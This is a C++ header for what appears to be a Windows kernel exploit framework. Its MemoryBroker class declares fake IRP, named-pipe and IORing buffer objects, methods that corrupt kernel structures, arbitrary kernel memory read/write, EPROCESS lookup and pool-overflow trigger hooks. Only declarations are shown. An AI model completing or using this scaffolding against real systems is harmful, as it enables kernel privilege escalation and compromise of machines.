#pragma once
#include "includes.h"
#include "functions.h"
#include "poolObjects.h"
#include <memory>



class MemoryBroker
{

private:

	BYTE* tmpData;
	IRP* fakeIRP;
	LFH_NP_DATA_QUEUE_ENTRY* fakePipeMessage;
	IOP_MC_BUFFER_ENTRY* fakeRegBuffer;


	pNtFsControlFile _NtFsControlFile;
	UINT64 HANDLE_TABLE;
	UINT64 TABLE_CODE;
	UINT64 EPROCESS;

	UINT64 buildNumber = 0;
	bool readEnabled = false;
	bool writeEnabled = false;
	
public:
	MemoryBroker();
    // External managers are referenced via weak_ptr to avoid owning them and
	// to validate lifetime before use.
	void SetPipeManager(std::shared_ptr<class PipeManager> pm) { pipeManager = pm; }
	void SetIoRingManager(std::shared_ptr<class IORingManager> irm) { ioRingManager = irm; }
	void SetNameManager(std::shared_ptr<class ThreadNameManager> nm) { nameManager = nm; }

	bool ReadEnabled();
	bool WriteEnabled();

	std::weak_ptr<class PipeManager> pipeManager;
	std::weak_ptr<class IORingManager> ioRingManager;
	std::weak_ptr<class ThreadNameManager> nameManager;


	void CreateFakeIRP();
	void CreateFakeRegBuffer(BYTE* seedData);
	void Read(UINT64* iDestinationAddr, UINT64 iTargetAddr, UINT64 iSize);
	void Write(BYTE* iDestinationAddr, UINT64 data, UINT64 size);



	bool GetEPROCESS(UINT64 iClientManager);

	bool GetThreadNameLayout();
	bool GetPipeLayout();
	bool GetIORingLayout();

	bool CorruptThreadName();
	bool CorruptPipe();
	bool CorruptIoRing();

	bool Cleanup();


	UINT64 HandleToPointer(HANDLE iHandle);
	bool EnumVersion();
	UINT64 GetOffset(std::string structName, std::string memberName);
	std::vector<UINT64> ScanForPoolTag(const BYTE* data, size_t size, const char* tag);

    // Helper to call the global Hvergelmir PrimeOverflow callback via singleton
	void InvokePrimeOverflow(UINT64 count);
    void InvokeTriggerOverflow(BYTE* buf, UINT64 size);
	void InvokePassOverflow();
};